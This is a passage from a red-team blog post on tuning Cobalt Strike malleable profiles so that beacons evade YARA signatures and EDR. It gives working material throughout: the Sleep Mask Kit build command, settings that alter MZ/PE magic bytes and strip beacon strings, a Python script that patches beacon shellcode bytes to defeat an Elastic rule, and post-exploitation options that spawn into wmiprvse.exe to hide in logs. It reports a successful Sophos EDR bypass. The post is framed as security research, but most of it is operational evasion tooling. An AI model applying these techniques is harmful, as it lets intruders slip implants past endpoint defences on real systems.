+    <span class="n">rich_header_hex</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">rich_header</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">rich_header_hex</span>
+
+<span class="c1">#make sure the number of opcodes has to be 4-byte aligned
+</span><span class="k">print</span><span class="p">(</span><span class="n">generate_rich_header</span><span class="p">(</span><span class="mi">100</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></div></div><p>Copy the output shellcode, and paste it in the profile (inside stage block):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>stage {
+    ...
+    set rich_header "\x2e\x9a\xad\xf1...";
+    ...
+}
+</pre></td></tr></tbody></table></code></div></div><p>Note: The length of Rich Header has to be 4-byte aligned, otherwise you will get this OPSEC warning:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-09-02-08-31.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-09-02-08-31.png" alt="opsec_warning" data-loaded="true"></p><p><strong>OPSEC Warning</strong>: To make the Rich Header look more legit, you can convert a real DLL and convert it to a shellcode format.</p><h2 id="bypassing-yara-rules">Bypassing YARA rules</h2><p>One of the most challenging YARA rules we faced is from <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar">elastic</a>. Let’s test our raw beacon with all the options we have modified/created by far in our malleable profile.</p><p>The rule <code class="language-plaintext highlighter-rouge">Windows_Trojan_CobaltStrike_b54b94ac</code> can be easily bypassed by using the Sleep Mask from the Arsenal Kit. Even though we previously enabled <code class="language-plaintext highlighter-rouge">sleep_mask</code> in the malleable profile via <code class="language-plaintext highlighter-rouge">set sleep_mask "true"</code>, it is still not enough to bypass this static signature, as the performed obfuscation routine is easily detected. In order to use the Sleep Mask Kit, generate the .CNA file via build.sh and import it to Cobalt Strike.</p><p>To generate the sleepmask, we must provide arguments. If you are using the latest Cobalt Strike version, put 47 as the first argument. The second argument is related to the used Windows API for Sleeping. We are going to use <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> since modern detection solutions possess countermeasures against <code class="language-plaintext highlighter-rouge">Sleep</code>, for example hooking sleep functions like <code class="language-plaintext highlighter-rouge">Sleep</code> in C/C++ or <code class="language-plaintext highlighter-rouge">Thread.Sleep</code> in C# to nullify the sleep, but also fast forwarding. The third argument is recommended to always be set to true, in order to mask plaintext strings inside the beacon’s memory. Lastly, the use of Syscalls will avoid User Land hooking; in this case indirect_randomized would be the best choice for the Sleep Mask Kit. You can generate the Sleep Mask Kit using the following bash command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>bash build.sh 47 WaitForSingleObject <span class="nb">true </span>indirect output/folder/
+</pre></td></tr></tbody></table></code></div></div><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-10.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-10.png" alt="building_sleep_mask_kit" data-loaded="true"></p><p>After loading the generated .CNA located in output/ we can scan our raw shellcode. Rule <code class="language-plaintext highlighter-rouge">b54b94ac</code> is bypassed, however, there are two more rules left to bypass.</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-01-14-14-1024x122.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-01-14-14-1024x122.png" alt="beacon_detected_by_two_yara_rules" data-loaded="true"></p><p>Let’s analyse what the rule <code class="language-plaintext highlighter-rouge">Windows_Trojan_CobaltStrike_1787eef5</code> is about:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image.png" alt="yara_detection_byte_mz_header" data-loaded="true"></p><p>By taking a brief look at the rule, we can clearly see that the rule is scanning for the PE headers such as 4D 5A (MZ header). We can confirm that our shellcode is indeed having the flagged bytes:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-6.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-6.png" alt="mz_header_living_in_beacon" data-loaded="true"></p><p>Fortunately Cobalt Strike has made it so much easier for us to modify the PE header by applying the following option to the profile:</p><blockquote><p>set magic_mz_x64 “OOPS”;</p></blockquote><p>The value can be anything as long as it is four characters long. Adding this option to our profile will make the beacon no longer detected by <code class="language-plaintext highlighter-rouge">Windows_Trojan_CobaltStrike_1787eef5</code>:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-5-1024x113.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-5-1024x113.png" alt="yara_rule_bypass_1787eef5" data-loaded="true"></p><p>And we can see how the magic bytes are changed to what we put earlier on the raw shellcode:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-02-06-00.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-02-06-00.png" alt="mz_header_changed_to_oops" data-loaded="true"></p><p>Now let’s bypass the <code class="language-plaintext highlighter-rouge">Windows_Trojan_CobaltStrike_f0b627fc</code> (the hardest one). When disassembling the opcodes of the YARA rule, we get the following:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-02-43-44.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-14-02-43-44.png" alt="opcodes_dissassembled" data-loaded="true"></p><p>We can confirm that this exists on our shellcode:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-7.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-7.png" alt="confirm_that_opcodes_exists_in_beacon" data-loaded="true"></p><p>To workaround this rule, we first have to analyze the shellcode in x64dbg. We set a breakpoint on and eax,0xFFFFFF (the flagged instructions by YARA). In the bottom-right corner of the video you can see that when performing the operations, the zero flag (ZF) is set to 1, thus not taking the jump (JNE instruction):</p><p>https://whiteknightlabs.com/wp-content/uploads/2023/05/Screencast-from-18.5.23-033406.MD-CEST.webm</p><p>We changed the instruction and eax,0xFFFFFF to mov eax,0xFFFFFF (since these two instructions are almost identical) and you can still see that when executed, the zero flag is still set to 1:</p><p>https://whiteknightlabs.com/wp-content/uploads/2023/05/Screencast-from-18.5.23-032619.MD-CEST.webm</p><p>Scanning the new generated binary with YARA leads to no detection (both static and in-memory):</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-18-14-05-20.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-18-14-05-20.png" alt="yara_fully_bypassed" data-loaded="true"></p><p>To fully automate the bytes replacement, we created a <a href="https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/rule_f0b627fc_bypass.py">python script</a> which generates the modified shellcode in a new binary file:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">replace_bytes</span><span class="p">(</span><span class="n">input_filename</span><span class="p">,</span> <span class="n">output_filename</span><span class="p">):</span>
+    <span class="n">search_bytes</span>      <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00</span><span class="s">"</span>
+    <span class="n">replacement_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00</span><span class="s">"</span>
+  
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_filename</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">input_file</span><span class="p">:</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">input_file</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">modified_content</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">search_bytes</span><span class="p">,</span> <span class="n">replacement_bytes</span><span class="p">)</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_filename</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">output_file</span><span class="p">:</span>
+        <span class="n">output_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">modified_content</span><span class="p">)</span>
+    
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Modified content saved to </span><span class="si">{</span><span class="n">output_filename</span><span class="si">}</span><span class="s">."</span><span class="p">)</span>
+
+<span class="c1"># Example usage
+</span><span class="n">input_filename</span> <span class="o">=</span> <span class="s">"beacon_x64.bin"</span>
+<span class="n">output_filename</span> <span class="o">=</span> <span class="s">"output.bin"</span>
+<span class="n">replace_bytes</span><span class="p">(</span><span class="n">input_filename</span><span class="p">,</span> <span class="n">output_filename</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></div></div><p>The code searches for the byte sequence <code class="language-plaintext highlighter-rouge">\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00</code> (and eax,0xFFFFFF) and replace it with the new byte sequence <code class="language-plaintext highlighter-rouge">\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00</code> (mov eax, 0xFFFFFF). The changes are later saved to the new binary file.</p><h2 id="improving-the-post-exploitation-stage">Improving the Post Exploitation stage</h2><p>We took our <a href="https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile">reference profile</a> and updated the Post Exploitation profile to the following:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>post-ex {
+    set pipename "Winsock2\\CatalogChangeListener-###-0";
+    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
+    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
+    set obfuscate "true";
+    set smartinject "true";
+    set amsi_disable "false";
+    set keylogger "GetAsyncKeyState";
+    #set threadhint "module!function+0x##"
+}
+</pre></td></tr></tbody></table></code></div></div><p>We had to turn off <code class="language-plaintext highlighter-rouge">threadhint</code> due to detection and also with AMSI disable, since those are a prime memory IOCs. Some profiles are using <code class="language-plaintext highlighter-rouge">svchost.exe</code> as a process to spawn, but that should never be used anymore. A really good alternative is spawning to <code class="language-plaintext highlighter-rouge">wmiprvse.exe</code> since this processor is heavily excluded on <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> and other SIEMs due to the extreme amount of logs generated.</p><h2 id="taking-down-the-final-boss">Taking down the final boss</h2><p>We cannot say this is a bypass unless we manage to bypass a fully-updated EDR; this time we went for Sophos. Bypassing <a href="https://www.sophos.com/en-us/products/endpoint-antivirus/edr">Sophos</a> (signature detection) was possible only by enabling the following option in the profile:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>set magic_pe "EA";
+
+transform-x64 {
+    prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
+    strrep "This program cannot be run in DOS mode" "";
+    strrep "ReflectiveLoader" "";
+    strrep "beacon.x64.dll" "";
+    strrep "beacon.dll" "";
+}
+</pre></td></tr></tbody></table></code></div></div><p>We’ve added set <code class="language-plaintext highlighter-rouge">magic_pe</code> which changes the PE header magic bytes (and code that depends on these bytes) to something else. You can use whatever you want here, so long as it’s two characters. The <code class="language-plaintext highlighter-rouge">prepend</code> can be only NOPs instructions, but it is highly recommend to use a junk shellcode generated by our python script (which we explained on the previous sections of the blogpost). While it bypasses the static detection, it is obviously not good enough to bypass the runtime one.</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Pasted-image-20230507164850.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Pasted-image-20230507164850.png" alt="dynamic_detection_by_sophos" data-loaded="true"></p><p>In order to bypass Sophos during the runtime execution, it is necessary to use all the options that are used on our <a href="https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile">reference profile</a> plus our enhancements. This way we created a fully working beacon that bypasses Sophos EDR (remember that no encryption was used):</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/SophosEDR_bypass.webm" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/SophosEDR_bypass.webm" alt="bypassing_sophos_without_encryption" data-loaded="true"></p><h2 id="conclusion">Conclusion</h2><p>Even though we used a very basic <a href="https://github.com/WKL-Sec/GregsBestFriend/blob/main/Clang-LLVM/GregsBestFriend.cpp">code for injecting the raw Shellcode</a> in a local memory process with RWX permission (bad OPSEC), we still managed to bypass modern detections. Utilizing a highly customized and advanced Cobalt Strike profile can prove to be an effective strategy for evading detection by EDR solutions and antivirus software, to such an extent that the encryption of shellcode may become unnecessary. With the ability to tailor the Cobalt Strike profile to specific environments, threat actors gain a powerful advantage in bypassing traditional security measures.</p><p>All the scripts and the final profiles used for bypasses are published in our <a href="https://github.com/WKL-Sec/Malleable-CS-Profiles">Github repository</a>.</p><h2 id="references">References</h2><p><a href="https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures">https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures</a><br> <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar">https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar</a><br> <a href="https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile">https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile</a><br> <a href="https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/">https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Harnessing%20the%20Power%20of%20Cobalt%20Strike%20Profiles%20for%20EDR%20Evasion%20-%20kleiton0x7e&amp;url=protocol://domain/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Twitter" data-original-title="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Harnessing%20the%20Power%20of%20Cobalt%20Strike%20Profiles%20for%20EDR%20Evasion%20-%20kleiton0x7e&amp;u=protocol://domain/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Facebook" data-original-title="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Harnessing%20the%20Power%20of%20Cobalt%20Strike%20Profiles%20for%20EDR%20Evasion%20-%20kleiton0x7e&amp;url=protocol://domain/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Telegram" data-original-title="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=protocol://domain/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="Linkedin" data-original-title="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label="" data-original-title=""> <i class="fa-fw "></i> </a> <i class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" data-original-title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip="">Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="https://kleiton0x00.github.io/posts/Navigating-Stealthy-WMI-Lateral-Movement/"><div class="card-body"> <span class="timeago small">Jun 25, 2023<i class="unloaded">2023-06-26T00:00:00+02:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Navigating Stealthy WMI Lateral Movement</h3><div class="text-muted small"><p> Mirrored from WKL Security Introduction In this article, we’ll look at a Python script that uses Windows Management Instrumentation (WMI) to remotely control a target computer. The script makes u...</p></div></div></a></div><div class="card"> <a href="https://kleiton0x00.github.io/posts/Masking-the-Implant-with-Stack-Encryption/"><div class="card-body"> <span class="timeago small">May 1, 2023<i class="unloaded">2023-05-02T00:00:00+02:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Masking the Implant with Stack Encryption</h3><div class="text-muted small"><p> Mirrored from WKL Security Introduction This article is a demonstration of memory-based detection and evasion techniques. Whenever you build a Command &amp; Control or you perform threat hunting,...</p></div></div></a></div><div class="card"> <a href="https://kleiton0x00.github.io/posts/Shellcodes-are-dead-long-live-fileless-shellcodes/"><div class="card-body"> <span class="timeago small">Feb 4, 2023<i class="unloaded">2023-02-05T00:00:00+01:00</i></span><h3 class="pt-0 mt-1 mb-3" data-toc-skip="">Shellcodes are dead, long live Fileless Shellcodes</h3><div class="text-muted small"><p> Recently I was developing a simple Shellcode Loader which uses Callbacks as an alternative of Shellcode execution. While it bypasses every runtime scanning, it failed to bypass the signature detect...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="https://kleiton0x00.github.io/posts/Masking-the-Implant-with-Stack-Encryption/" class="btn btn-outline-primary"><p>Masking the Implant with Stack Encryption</p></a> <a href="https://kleiton0x00.github.io/posts/Navigating-Stealthy-WMI-Lateral-Movement/" class="btn btn-outline-primary"><p>Navigating Stealthy WMI Lateral Movement</p></a></div></div></div></div> </div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a>    
+</body></html>
